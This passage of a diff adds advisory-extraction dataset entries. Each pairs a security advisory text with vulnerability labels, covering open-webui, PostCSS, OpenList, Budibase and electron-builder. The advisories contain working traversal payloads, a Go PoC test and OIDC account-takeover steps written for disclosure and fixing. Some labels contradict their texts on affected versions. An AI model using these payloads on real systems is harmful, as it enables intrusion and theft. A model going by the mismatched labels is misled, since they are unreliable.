%2E%2E%2F%61%64%6D%69%6E%2F%73%79%73%74%65%6D\n{'raw_path': '/base/..%2Fadmin%2Fsystem', 'path': '/base/../admin/system'}\n```\n\nThe 9x encoded path argument is 285 bytes long, so this is not a megabyte-sized or impractical URL. When sent through the real route, account for the ASGI server decoding the HTTP path once before filling the `{path:path}` parameter: an external request can use one additional encoding layer so `_sanitize_proxy_path()` receives the 9x encoded parameter shown above.\n\n## Root Cause / Technical Details\n\n`_sanitize_proxy_path()` in `backend/open_webui/routers/terminals.py` performs this loop:\n\n```python\ndecoded = path\nfor _ in range(8):\n    once = unquote(decoded)\n    if once == decoded:\n        break\n    decoded = once\n```\n\nThe subsequent traversal check is applied only to the value after those 8 iterations. If the input still contains encoded dot and slash bytes after the loop, `posixpath.normpath()` treats them as ordinary characters rather than path separators. The code then builds `target_url = f'{base_url}/{safe_path}'` and sends it with `aiohttp.ClientSession.request()`. The upstream server receives and decodes the forwarded path, turning the accepted `%2E%2E%2F...` into `../...`.\n\nThe same vulnerable sanitizer is present in v0.9.6, the latest release. I verified the v0.9.6 `backend/open_webui/routers/terminals.py` hash matches current main for this file.\n\n## Remediation\n\nDo not rely on a fixed decode-depth cap for a traversal security boundary. Recommended fixes:\n\n1. Decode until stable with a strict input length cap, and reject if the final value still contains encoded dot, slash, or backslash separators.\n2. Reconstruct the allowed relative path from fully decoded segments: split on path separators, reject empty/current/parent segments, then join allowed segments with `/`.\n3. Add regression tests for at least 9x and 10x encoded `../` payloads, including a route-level test that accounts for the ASGI server's initial path decode before the `{path:path}` parameter reaches `_sanitize_proxy_path()`.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-59221",
+          "affected_products": [
+            {
+              "vendor": "PIP",
+              "product": "open-webui",
+              "version_range": ">= 0.9.6, < 0.10.0"
+            }
+          ],
+          "cwe_category": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "An attacker can bypass terminal proxy boundary and access unintended paths with existing admin-configured terminal connections.",
+          "remediation_action": "Update the sanitizer to handle 9+ iterations of unquote safely."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-r28c-9q8g-f849",
+    "input_text": "## Vulnerability Details\n\n**File**: `lib/previous-map.js`\n**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)\n\n\n### Root Cause\nPostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a \"previous source map.\" This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).\n\n`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified \u2014 an absolute path in the CSS comment is read verbatim.\n\n8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in `.map` remains readable through this path in the current release (8.5.16).\n\nOnce loaded, `MapGenerator.isMap()` treats the mere presence of a loaded \"previous map\" as an implicit request to generate `result.map`, even when the caller never set the `map` option. If the loaded map has a `sourcesContent` field (common for maps emitted by bundlers/transpilers), that content is merged into `result.map` and returned to the caller \u2014 disclosing the traversed-to file's content to whoever supplied the CSS.\n\n### Attack Scenario\n1. A service accepts user-submitted CSS and runs it through PostCSS to lint/format/transform it, e.g. `postcss().process(userCss, { from: '/app/uploads/user123/input.css', to: '/app/uploads/user123/output.css' })` \u2014 idiomatic usage; `map` option untouched.\n2. Attacker submits CSS containing `/*# sourceMappingURL=../../../../some/other/app/dist/bundle.js.map */` (or an absolute path if `from` is unset).\n3. PostCSS reads that `.map` file and folds its `sourcesContent` into `result.map`.\n4. The service does what most build pipelines do with a truthy `result.map` \u2014 writes it next to the CSS output or returns it via API (source maps are meant to be consumed by browser devtools, so this is commonly public/served).\n5. Attacker retrieves the emitted map and reads out the traversed file's content.\n\n### Impact\nDisclosure of the contents of arbitrary `.map` files reachable via path traversal (or absolute path when `from` is unset) from the process's filesystem. Affects any application processing CSS it does not fully trust without explicitly passing `map: false`. No authentication or user interaction beyond submitting CSS text is required.\n\n### Vulnerable Code\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n\nloadMap(file, prev) {\n  ...\n  } else if (this.annotation) {\n    let map = this.annotation\n    if (file) map = join(dirname(file), map)\n    let unknown = this.loadFile(map, file, false)\n    ...\n  }\n}\n```\n\n### Recommended Fix\nConstrain the resolved path to remain inside the CSS file's own directory instead of relying solely on a filename-extension check:\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted && !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (!cssFile) return undefined\n    let root = resolve(dirname(cssFile))\n    let resolvedPath = resolve(root, path)\n    if (resolvedPath !== root && !resolvedPath.startsWith(root + sep)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\nI've implemented, tested (full existing test suite \u2014 660/660 passing, plus new PoC-based regression checks for both the traversal and legitimate same-directory cases), and can share this fix on request or via a private fork if invited.\n\n### Verification\nDynamically confirmed on v8.5.16 (current npm release / repo HEAD) via a standalone Node.js harness against `lib/postcss.js`: a \"secret\" `.map` file placed two directories outside a simulated project directory was read via a crafted `sourceMappingURL` comment in otherwise-innocuous CSS, with its `sourcesContent` appearing verbatim in `result.map.toString()` \u2014 with no `map` option set by the caller. A second harness confirmed the simpler no-`from` case reads an absolute path directly. A third harness confirmed `map: false` is the only current workaround. The attached fix branch closes both vectors while keeping all 660 existing unit tests green.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "postcss",
+              "version_range": "<= 8.5.17"
+            }
+          ],
+          "cwe_category": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "Arbitrary disclosure of contents from reachable .map files through path traversal.",
+          "remediation_action": "Explicitly constrain the resolved path to remain inside the CSS file's directory."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-95cv-r8x4-vh75",
+    "input_text": "### Summary\n\nThe `/api/fs/batch_rename` handler validates and authorizes only the requested source directory. It rejects path separators in `new_name`, but it does not validate `src_name`. The handler concatenates `src_dir` and attacker-controlled `src_name`, then passes the result to the filesystem rename layer, where the path is normalized.\n\nAn authenticated user with rename permission can set `src_name` to traversal segments such as `../../ab/secret.txt`. When the user's base path is `/team/a` and `src_dir` is `/writable`, the authorized directory becomes `/team/a/writable`, but the final source path normalizes to `/team/ab/secret.txt`. The file outside the user's base path is then renamed.\n\n### Details\n\nThe HTTP API registers filesystem management routes under the authenticated group:\n\n- `server/router.go:104` registers `_fs(auth.Group(\"/fs\"))`.\n- `server/router.go:198` through `server/router.go:205` expose `/api/fs/batch_rename`.\n\nThe vulnerable code is in `server/handles/fsbatch.go`:\n\n- `src_dir` is constrained through `user.JoinPath(req.SrcDir)` (`server/handles/fsbatch.go:170` through `server/handles/fsbatch.go:174`).\n- Write permission is checked only for that constrained directory (`server/handles/fsbatch.go:176` through `server/handles/fsbatch.go:185`).\n- The loop checks `renameObject.NewName` with `checkRelativePath`, but does not check `renameObject.SrcName` (`server/handles/fsbatch.go:186` through `server/handles/fsbatch.go:194`).\n- The handler builds `filePath := fmt.Sprintf(\"%s/%s\", reqPath, renameObject.SrcName)` and passes it to `fs.Rename` (`server/handles/fsbatch.go:195` through `server/handles/fsbatch.go:196`).\n\nThe single-file rename path shows the intended pattern: `checkRelativePath(req.Name)` rejects separators, empty strings, `.`, and `..` before renaming (`server/handles/fsmanage.go:284` through `server/handles/fsmanage.go:333`). Batch rename applies this protection to the destination name only, not to the source name.\n\nLower layers normalize the source path before operating on it:\n\n- `utils.FixAndCleanPath` replaces backslashes with slashes, forces an absolute slash prefix, and calls `path.Clean` (`pkg/utils/path.go:18` through `pkg/utils/path.go:24`).\n- `JoinBasePath` rejects traversal in the original `src_dir`, not in the later concatenated `src_name` (`pkg/utils/path.go:80` through `pkg/utils/path.go:87`).\n\nFalse-positive checks performed:\n\n- The user in the PoC had only normal authenticated user role plus rename permission, not admin role.\n- The handler successfully authorized `/team/a/writable`, then renamed `/team/ab/secret.txt`, proving that the later source path escaped the authorized directory.\n- `new_name` validation remained in effect; the exploit uses traversal only in `src_name`.\n- The test checked the original sibling file disappeared and the renamed sibling file contained the same contents.\n\n### PoC\n\nSafe local reproduction used a temporary in-memory sqlite database and temporary Local storage root. No external services were contacted by the PoC route; Go dependency/toolchain downloads may occur if the environment lacks cached modules.\n\nAdd this temporary test under `server/handles/security_poc_test.go` in a clean checkout of the tested commit. If also testing the share finding, the helper functions can be shared between the two tests.\n\n```go\npackage handles\n\nimport (\n    \"bytes\"\n    \"context\"\n    \"encoding/json\"\n    \"net/http\"\n    \"net/http/httptest\"\n    \"os\"\n    \"path/filepath\"\n    \"strings\"\n    \"testing\"\n\n    _ \"github.com/OpenListTeam/OpenList/v4/drivers/local\"\n    \"github.com/OpenListTeam/OpenList/v4/internal/conf\"\n    \"github.com/OpenListTeam/OpenList/v4/internal/db\"\n    \"github.com/OpenListTeam/OpenList/v4/internal/model\"\n    \"github.com/OpenListTeam/OpenList/v4/internal/op\"\n    \"github.com/OpenListTeam/OpenList/v4/pkg/utils\"\n    \"github.com/gin-gonic/gin\"\n    \"github.com/glebarez/sqlite\"\n    \"gorm.io/gorm\"\n)\n\nfunc setupSecurityPoCTest(t *testing.T, root string) *model.User {\n    t.Helper()\n    database, err := gorm.Open(sqlite.Open(\"file:\"+t.Name()+\"?mode=memory&cache=shared\"), &gorm.Config{})\n    if err != nil {\n        t.Fatal(err)\n    }\n    conf.Conf = conf.DefaultConfig(t.TempDir())\n    db.Init(database)\n\n    addition, err := utils.Json.MarshalToString(map[string]string{\"root_folder_path\": root})\n    if err != nil {\n        t.Fatal(err)\n    }\n    _, err = op.CreateStorage(context.Background(), model.Storage{Driver: \"Local\", MountPath: \"/\", Addition: addition})\n    if err != nil {\n        t.Fatal(err)\n    }\n\n    user := &model.User{\n        Username:   \"alice\",\n        BasePath:   \"/team/a\",\n        Role:       model.GENERAL,\n        Permission: 1<<4 | 1<<14,\n    }\n    if err := db.CreateUser(user); err != nil {\n        t.Fatal(err)\n    }\n    return user\n}\n\nfunc requestWithUser(t *testing.T, method, target string, body any, user *model.User) (*gin.Context, *httptest.ResponseRecorder) {\n    t.Helper()\n    payload, err := json.Marshal(body)\n    if err != nil {\n        t.Fatal(err)\n    }\n    recorder := httptest.NewRecorder()\n    ctx, _ := gin.CreateTestContext(recorder)\n    req := httptest.NewRequest(method, target, bytes.NewReader(payload))\n    req.Header.Set(\"Content-Type\", \"application/json\")\n    req = req.WithContext(context.WithValue(req.Context(), conf.UserKey, user))\n    ctx.Request = req\n    return ctx, recorder\n}\n\nfunc TestPOCBatchRenameSrcNameTraversalEscapesUserBase(t *testing.T) {\n    gin.SetMode(gin.TestMode)\n    root := t.TempDir()\n    if err := os.MkdirAll(filepath.Join(root, \"team\", \"a\", \"writable\"), 0o700); err != nil {\n        t.Fatal(err)\n    }\n    if err := os.MkdirAll(filepath.Join(root, \"team\", \"ab\"), 0o700); err != nil {\n        t.Fatal(err)\n    }\n    secretPath := filepath.Join(root, \"team\", \"ab\", \"secret.txt\")\n    if err := os.WriteFile(secretPath, []byte(\"secret\"), 0o600); err != nil {\n        t.Fatal(err)\n    }\n    user := setupSecurityPoCTest(t, root)\n\n    ctx, recorder := requestWithUser(t, http.MethodPost, \"/api/fs/batch_rename\", gin.H{\n        \"src_dir\": \"/writable\",\n        \"rename_objects\": []gin.H{{\n            \"src_name\": \"../../ab/secret.txt\",\n            \"new_name\": \"renamed.txt\",\n        }},\n    }, user)\n    FsBatchRename(ctx)\n\n    if recorder.Code != http.StatusOK || !strings.Contains(recorder.Body.String(), `\"code\":200`) {\n        t.Fatalf(\"expected batch rename success, status=%d body=%s\", recorder.Code, recorder.Body.String())\n    }\n    if _, err := os.Stat(secretPath); !os.IsNotExist(err) {\n        t.Fatalf(\"expected original sibling file to be renamed, stat err=%v\", err)\n    }\n    renamedPath := filepath.Join(root, \"team\", \"ab\", \"renamed.txt\")\n    got, err := os.ReadFile(renamedPath)\n    if err != nil {\n        t.Fatalf(\"expected renamed sibling file at %s: %v\", renamedPath, err)\n    }\n    if string(got) != \"secret\" {\n        t.Fatalf(\"unexpected renamed file contents: %q\", got)\n    }\n}\n```\n\nRun:\n\n```bash\ngo test ./server/handles -run TestPOCBatchRenameSrcNameTraversalEscapesUserBase -v\n```\n\nObserved vulnerable output in this environment:\n\n```text\n=== RUN   TestPOCBatchRenameSrcNameTraversalEscapesUserBase\n--- PASS: TestPOCBatchRenameSrcNameTraversalEscapesUserBase (0.01s)\nPASS\nok  \tgithub.com/OpenListTeam/OpenList/v4/server/handles\n```\n\nCombined final confirmation command used during the audit:\n\n```bash\ngo test ./server/handles -run 'TestPOC(ShareCreateAcceptsSiblingPathOutsideUserBase|BatchRenameSrcNameTraversalEscapesUserBase)' -v\n```\n\nObserved combined output:\n\n```text\n=== RUN   TestPOCShareCreateAcceptsSiblingPathOutsideUserBase\n--- PASS: TestPOCShareCreateAcceptsSiblingPathOutsideUserBase (0.01s)\n=== RUN   TestPOCBatchRenameSrcNameTraversalEscapesUserBase\n--- PASS: TestPOCBatchRenameSrcNameTraversalEscapesUserBase (0.01s)\nPASS\nok  \tgithub.com/OpenListTeam/OpenList/v4/server/handles\t(cached)\n```\n\nNegative/control cases checked:\n\n- `src_dir` traversal is rejected by `user.JoinPath` because `JoinBasePath` detects relative traversal in the original request path.\n- `new_name` traversal is rejected by `checkRelativePath` because it contains `/`, `\\\\`, `.`, or `..` patterns.\n- The exploit succeeds because `src_name` is not passed through the same relative filename check before concatenation.\n\nCleanup:\n\n```bash\nrm server/handles/security_poc_test.go\n```\n\n### Impact\n\nA restricted authenticated user can rename files outside the authorized source directory and outside their configured base path. In a multi-user deployment, a user confined to `/team/a` can rename a guessed sibling file such as `/team/ab/secret.txt` to `/team/ab/renamed.txt` by submitting traversal segments in `src_name`.\n\nThis is an integrity violation against other users' files. It can also cause limited availability impact by moving files away from expected names, and it may reveal whether guessed out-of-base files exist based on success or error responses.\n\n### Suggested remediation\n\nValidate `renameObject.SrcName` with the same relative filename constraints already applied to `renameObject.NewName`, or derive source objects only from a trusted directory listing of `reqPath`.\n\nA minimal fix is to call `checkRelativePath(renameObject.SrcName)` before constructing `filePath`. Add regression tests covering:\n\n- `src_name: \"file.txt\"` succeeds;\n- `src_name: \"../secret.txt\"` is denied;\n- `src_name: \"../../ab/secret.txt\"` is denied when base path is `/team/a` and `src_dir` is `/writable`;\n- `new_name` traversal remains denied.\n\n### Credits\n- Thai Son Dinh from VinSOC Labs (R&D)",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "GO",
+              "product": "github.com/OpenListTeam/OpenList/v4",
+              "version_range": "<= 4.2.3"
+            }
+          ],
+          "cwe_category": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "An authenticated user can rename files outside their intended directory due to inadequate path validation.",
+          "remediation_action": "Implement full path validation for both source and destination names to prevent unauthorized file renaming."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-hp6v-6jw7-gv2f",
+    "input_text": "### Summary\nBudibase's OIDC SSO login links an incoming SSO identity to an existing Budibase account **by email address alone**, without ever checking the `email_verified` claim of the OIDC ID token. Budibase first tries to match the IdP `sub`; when that misses (any fresh attacker IdP account) it silently falls back to matching by the `email` claim and **merges into the existing account by email**, preserving that account's `_id` and roles. Because the `email_verified` flag is never read, an attacker who can make a **configured/trusted** IdP emit a token carrying `email = <victim>` with `email_verified = false` is logged into Budibase **as the victim**, inheriting the victim's roles (including global admin/builder). Per OIDC Core \u00a75.7 the `email` claim MUST NOT be used as an identity key unless `email_verified` is `true`; Budibase effectively delegates all account-linking trust to every configured IdP's email-verification policy while checking nothing itself. Full account takeover of any existing Budibase user, including the instance owner.\n\n### Details\nThe OIDC verify callback extracts the email and never consults `email_verified`:\n- `packages/backend-core/src/middleware/passport/sso/oidc.ts:59` \u2014 `email: getEmail(profile, jwtClaims)`.\n- `getEmail` (`oidc.ts:113-135`) returns `profile._json.email` ->`jwtClaims.email` -> `preferred_username`. **No `email_verified` check.**\n- `buildJwtClaims` (`oidc.ts:99-107`) assembles claims from `_json.email`/`emails[0].value` \u2014 no verification flag is read. `grep -r email_verified packages/` -> 0 hits.\n\nThe email is then used as the **account-linking key**:\n- `sso.authenticate(...)` -> `packages/backend-core/src/middleware/passport/sso/sso.ts`:\n  - `:38,44` `users.getById(generateGlobalUserID(details.userId))` keyed on the IdP `sub`; for a fresh attacker IdP account this 404s and is swallowed (`:45-54`).\n  - `:57-59` **fallback:** `dbUser = await users.getGlobalUserByEmail(details.email)` -> loads the **victim's** account (victim `_id` + roles) purely by email (`packages/backend-core/src/users/users.ts:100-124`, `USER_BY_EMAIL` view, no binding to the IdP `sub`).\n  - `syncUser(...)` (`sso.ts:80,102-138`) spreads `...user`, preserving the victim `_id`/`tenantId`/`roles`; only overwrites provider fields.\n- `UserDB.save` (`packages/backend-core/src/users/db.ts:235`): because `ssoUser._id` is the victim's, the `_id` branch runs (`:253`), `getById(_id)` matches the victim (`:256`), the \"Email address cannot be changed\" guard (`:257-259`) does not fire (`dbUser.email === email`), and the `EmailUnavailableError` guard (`:269-275`) is skipped (it only runs in the `!dbUser` branch). The merge proceeds silently; a session JWT is issued for the victim.\n\nPer OIDC Core \u00a75.7, the `email` claim MUST NOT be used as an identity key unless `email_verified` is `true`. Budibase never reads the flag.\n\n**Preconditions (attack requirement \u2014 `AT:P`):** the attacker must be able to authenticate through an IdP that the Budibase instance **trusts** AND get that IdP to assert the victim's email with `email_verified = false`. This is reachable, not exotic:\n- **Self-registration with an unverified email \u2014 Keycloak and Authentik ship with *\"Verify Email\" OFF by default*; if the trusted IdP allows public sign-up, the attacker registers a new account and simply enters `email = <victim>` at sign-up. No confirmation email is needed \u2014 the IdP stores and asserts it unverified.**\n- **Self-service profile editing** \u2014 many IdPs let a logged-in user change their own email without forced re-verification.\n- **Attacker-operated / federated IdP or permissive social login** \u2014 where the attacker controls or influences a trusted provider, or the provider asserts a user-typed (unverified) email.\nIt is **not** exploitable through a strict corporate IdP that enforces email verification (there `email_verified = true` and the attacker cannot claim the victim's address) \u2014 which is exactly why Budibase must check the flag rather than assume every configured IdP enforces it. The defect is unconditional on the Budibase side; the attack requirement is purely the (default, common) IdP email policy.\n\n### PoC\nReproduced live on Budibase `3.39.14` (self-hosted, community license) against a stock **Keycloak 26** realm `budi` with default \"Verify Email\" = off; OIDC client registered and activated in Budibase.\n\n**Setup:** a pre-existing **victim** global-admin Budibase account `victim@stand.local` (`_id = us_1ab2dfcf\u2026`, local account, *no IdP link*). The attacker owns their **own** IdP account (`attacker`, distinct `sub`) and can set its email attribute unverified.\n\n**Step 1 \u2014 the IdP asserts the claim (proves `email_verified=false`):**\n```\nPOST /realms/budi/protocol/openid-connect/token   (Keycloak)\ngrant_type=password&client_id=budibase&client_secret=\u2026&username=attacker&password=Attacker123!&scope=openid email profile\n-> id_token payload: { \"sub\":\"3cf58c45-\u2026\", \"preferred_username\":\"attacker\",\n                      \"email\":\"victim@stand.local\", \"email_verified\":false }\n```\nThe authenticated principal is provably **`attacker`** (its own `sub`/`preferred_username`/password), merely *claiming* the victim's email, unverified.\n\n<img width=\"1484\" height=\"685\" alt=\"image\" src=\"https://github.com/user-attachments/assets/cdddac3c-b7c0-4c59-aaec-9092706a7ad8\" />\n\n\n**Step 2 \u2014 drive the standard OIDC flow** as `attacker`:\n`GET /api/global/auth/default/oidc/configs/kc-oidc-1` -> IdP login as `attacker`/`Attacker123!` -> `GET /api/global/auth/oidc/callback?code=\u2026&state=\u2026`.\n\n<img width=\"1145\" height=\"454\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ac0a73d0-c5fc-4d0f-b9b0-95f6273b99f7\" />\n\n<img width=\"1172\" height=\"445\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a4b27a7e-4293-4caf-957f-d27c54ea461a\" />\n\n<img width=\"1157\" height=\"648\" alt=\"image\" src=\"https://github.com/user-attachments/assets/06699774-92b0-4163-a171-9a30bc877ecc\" />\n\n<img width=\"1201\" height=\"525\" alt=\"image\" src=\"https://github.com/user-attachments/assets/92a92fcf-9d29-42ca-921d-de6fbd78198f\" />\n\n\n\n**Step 3 \u2014 result (takeover):** Budibase sets `budibase:auth` to a session JWT\n`{ \"userId\":\"us_1ab2dfcf\u2026\", \"email\":\"victim@stand.local\", \"tenantId\":\"default\" }`, and\n`GET /api/global/self` returns the **victim**: `_id = us_1ab2dfcf\u2026`, `admin.global = true`, `builder.global = true`, `providerType = oidc`. The attacker authenticated as a *different* IdP principal with an *unverified* email yet now holds a full global-admin session for the victim.\n\n<img width=\"1001\" height=\"456\" alt=\"image\" src=\"https://github.com/user-attachments/assets/c8dfc25f-aed7-4cd7-9323-f029e4d1a725\" />\n\n\n**Negative control (proves the email claim is the cause, not a normal self-login):**\nA second attacker `attacker2` with a **benign** unverified email `attacker2@evil.local` (matching no Budibase user) runs the *identical* flow:\n```\nid_token: { \"sub\":\"55794bf2-\u2026\", \"preferred_username\":\"attacker2\", \"email\":\"attacker2@evil.local\", \"email_verified\":false }\n-> budibase:auth: { \"userId\":\"us_55794bf2-\u2026\" }   (a NEW account, _id derived from the IdP sub)\n-> /api/global/self: { \"_id\":\"us_55794bf2-\u2026\", \"email\":\"attacker2@evil.local\", admin.global: null, builder.global: null }\n```\n<img width=\"1153\" height=\"489\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8f6cb849-e6f3-49f1-b576-8aeba026a3be\" />\n\n<img width=\"1089\" height=\"466\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a892ec3e-3753-4bc0-9eee-9f0613b2d92e\" />\n\n<img width=\"826\" height=\"532\" alt=\"image\" src=\"https://github.com/user-attachments/assets/cc30bd9c-1bdb-4bea-934f-a8b3e228940e\" />\n\n\nWith a benign email the attacker gets **their own new low-privilege account**; only when the email claim equals the victim's does the same flow yield the **victim's admin account**. Same self-authentication, single variable changed = the unverified-email merge is the vulnerability.\n\n### Impact\nTakeover of any existing Budibase account by email, including the instance owner / global admin -> full control of the tenant (apps, datasources, automations, user management, stored datasource credentials). The attacker authenticates as their *own* (different) IdP principal and ends up holding the victim's session and roles. The only requirement beyond a trusted IdP login is that the IdP assert the victim's email unverified \u2014 the default for a freshly-created Keycloak/Authentik realm and common in social logins (see Preconditions). Any deployment that trusts an OIDC IdP without enforced email verification is exposed; the Budibase-side flaw (ignoring `email_verified`) is unconditional.\n\n### Remediation\n**Primary fix:** in the OIDC verify path, require `email_verified === true` before using `email` to look up / link an existing account; otherwise reject the login (or fall back to `sub`-only matching and never merge into a pre-existing local/SSO account). Concretely, thread the `email_verified` claim through `buildJwtClaims`/`getEmail` (`oidc.ts`) and gate the `getGlobalUserByEmail` fallback in `sso.ts:57-59` on it.\n\n**Audit the whole class:** apply the same `email_verified` (and, for SAML, `EmailVerified`/assertion-signature) gate to every SSO strategy that links by email \u2014 OIDC, SAML, and any social provider \u2014 not only the Google strategy (which already passes `requireLocalAccount=true`). Email-based account linking anywhere must require a verified email.\n\n**Defense-in-depth for operators who cannot patch immediately:**\n- On the IdP, enable \"Verify Email\" / require verified email before issuing tokens (Keycloak: realm -> Login -> Verify Email = on), and restrict which email domains the IdP will assert.\n- Prefer `sub`-based account mapping over email in the IdP/Budibase mapping config where available.\n- Audit existing accounts for unexpected OIDC links to privileged users; rotate sessions.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "@budibase/server",
+              "version_range": "<= 3.38.1"
+            }
+          ],
+          "cwe_category": "Improper Authentication",
+          "severity": "critical",
+          "attack_vector": "unknown",
+          "impact_summary": "Budibase users can be fully taken over by attackers who exploit unverified email addresses through trusted identity providers.",
+          "remediation_action": "Implement checks for the `email_verified` claim when processing OIDC ID tokens to prevent unauthorized account takeover."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-p2f4-r6v6-j797",
+    "input_text": "## Summary\n\nIn `electron-builder`'s `builder-util-runtime` package, the HTTP redirect handler (`HttpExecutor.prepareRedirectUrlOptions`) only stripped a credential header whose key string matched exactly lowercase `\"authorization\"`. Other credential-bearing headers \u2014 most notably `PRIVATE-TOKEN` (used by GitLab's personal access token flow) and mixed-case `Authorization` (used by GitLab's Bearer/OAuth flow) \u2014 were not stripped and could be forwarded to an attacker-controlled cross-origin redirect destination.\n\n---\n\n## Details\n\n### Root cause\n\n`HttpExecutor.prepareRedirectUrlOptions` (introduced in `builder-util-runtime` via [PR #9211](https://github.com/electron-userland/electron-builder/pull/9211), first released in `v26.0.20`) performed its cross-origin credential strip with a single case-sensitive property check:\n\n```typescript\n// vulnerable code (electron-builder v26.0.20 \u2013 v26.14.x) [via builder-util-runtime <9.7.0]\nif (headers?.authorization) {\n  if (HttpExecutor.isCrossOriginRedirect(originalUrl, parsedRedirectUrl)) {\n    delete headers.authorization   // only removes the exact key \"authorization\"\n  }\n}\n```\n\nJavaScript object property access is case-sensitive. The guard `headers?.authorization` evaluates to `undefined` (falsy) when the key is `\"Authorization\"`, `\"AUTHORIZATION\"`, or any other casing, so the branch is never entered and **no header is deleted** for those cases.\n\n### Affected updater flows\n\nThe clearest reproduced path is the private GitLab updater flow.\n\n`packages/electron-updater/src/providers/GitLabProvider.ts` sets one of two credential headers depending on the token type:\n\n```typescript\n// GitLabProvider.setAuthHeaderForToken (affected versions)\nif (token.startsWith(\"Bearer\")) {\n  headers.authorization = token        // Bearer / OAuth token  \u2192  key is lowercase\n} else {\n  headers[\"PRIVATE-TOKEN\"] = token     // personal access token \u2192  key is \"PRIVATE-TOKEN\"\n}\n```\n\nDuring a private release update check, the updater requests a release asset through GitLab's `direct_asset_url`. GitLab commonly redirects asset downloads to an external object-storage origin (e.g., S3, GCS). Because the redirect crosses origins:\n\n1. A personal access token in `PRIVATE-TOKEN` **is never inspected** by the vulnerable strip guard \u2014 it is forwarded intact.\n2. A Bearer token set as `headers.authorization` (lowercase) **is stripped** correctly.\n3. A Bearer token set as `headers.Authorization` (capital A) or any other mixed-case variant **bypasses the guard** and is forwarded intact.\n\nGitLab is the concrete reproduced case; any other provider or custom updater configuration that places credentials in a non-lowercase-`authorization` header is equally affected.\n\n### Before v26.0.20\n\nVersions prior to `v26.0.20` did not contain `prepareRedirectUrlOptions` at all. All credential headers were forwarded unchanged on every redirect, regardless of origin. This represents a broader, pre-existing version of the same class of vulnerability.\n\n---\n\n## Proof of concept (reproduction shape)\n\n1. Configure the updater with an authenticated GitLab provider, supplying a personal access token (non-Bearer). The provider will set `PRIVATE-TOKEN: <token>` on requests.\n2. Trigger an update check. The updater fetches release metadata and then requests a release asset URL.\n3. The trusted GitLab origin returns a 3xx cross-origin redirect (e.g., to S3 object storage).\n4. `HttpExecutor.prepareRedirectUrlOptions` is called. The guard `headers?.authorization` is falsy (the key is `\"PRIVATE-TOKEN\"`). No header is deleted.\n5. The request to the redirect destination is issued with `PRIVATE-TOKEN: <token>` present in the headers.\n\n**Observed result:** The personal access token is forwarded to the redirect destination. An attacker who controls or can observe the redirect destination receives the token.\n\n---\n\n## Impact\n\nThis is a credential disclosure vulnerability. An automatic update check can leak:\n\n- GitLab personal access tokens (`PRIVATE-TOKEN`)\n- Bearer/OAuth tokens sent under a mixed-case `Authorization` key\n- Any other credential header not named exactly `\"authorization\"` in lowercase\n\nDisclosure of a GitLab PAT grants the attacker whatever repository and API permissions the token carries, enabling unauthorized access to private source code, packages, or release artifacts.\n\n---\n\n## Patches\n\nFixed in electron-builder `v26.15.0` [included via `v9.7.0` `builder-util-runtime`] via [PR #9834](https://github.com/electron-userland/electron-builder/pull/9834) (commit [`22a7532bd`](https://github.com/electron-userland/electron-builder/commit/22a7532bd01b9fb42cff7c58d599c7ad683569fe)).\n\nThe incomplete property-access guard was replaced with a separator-agnostic, case-insensitive lookup against a registry of known sensitive header names:\n\n```typescript\n// fixed code (v9.7.0+)\nconst normalizeName = (name: string): string =>\n  name.toLowerCase().replace(/[-_]/g, \"\")\n\nconst SENSITIVE_REDIRECT_HEADERS = new Set([\n  \"authorization\", \"proxyauthorization\", \"privatetoken\",\n  \"xapikey\", \"xauthtoken\", \"xaccesstoken\", \"xgitlabtoken\",\n  \"cookie\", \"xcsrftoken\",\n])\n\n// In prepareRedirectUrlOptions, on cross-origin redirect:\nfor (const key of Object.keys(headers)) {\n  if (SENSITIVE_REDIRECT_HEADERS.has(normalizeName(key))) {\n    delete (headers as Record<string, unknown>)[key]\n  }\n}\n```\n\n`normalizeName` converts to lowercase and strips `-` and `_` separators, so `PRIVATE-TOKEN`, `Private-Token`, `Authorization`, 